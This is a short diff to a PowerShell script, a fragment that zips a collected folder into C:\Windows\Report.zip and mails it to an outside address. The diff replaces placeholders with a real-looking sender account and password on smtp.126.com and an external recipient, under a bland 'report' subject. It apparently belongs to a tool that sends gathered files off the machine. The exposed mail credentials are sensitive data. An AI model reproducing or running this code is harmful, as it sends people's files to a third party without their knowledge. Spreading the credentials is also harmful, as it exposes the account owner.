@@ -2829,23 +2829,23 @@ Start-sleep -seconds 1 }}}
 
 copy-ToZip($fileSaveDir)
 
-$SMTPServer = 'smtp.qq.com'
+$SMTPServer = 'smtp.126.com'
 
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 
 $SMTPInfo.EnableSsl = $true
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xxx@qq.com', 'bhuhlaxxxxxxxxx');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('free897@126.com', 'wodemim8');
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = 'xxxx@qq.com'
+$ReportEmail.From = 'free897@126.com'
 
-$ReportEmail.To.Add('xxxx@qq.com')
+$ReportEmail.To.Add('hiforyou@yeah.com')
 
-$ReportEmail.Subject = 'xxx'
+$ReportEmail.Subject = 'report'
 
-$ReportEmail.Body = 'xxx' 
+$ReportEmail.Body = 'report' 
 
 $ReportEmail.Attachments.Add('C:\Windows\Report.zip')
 
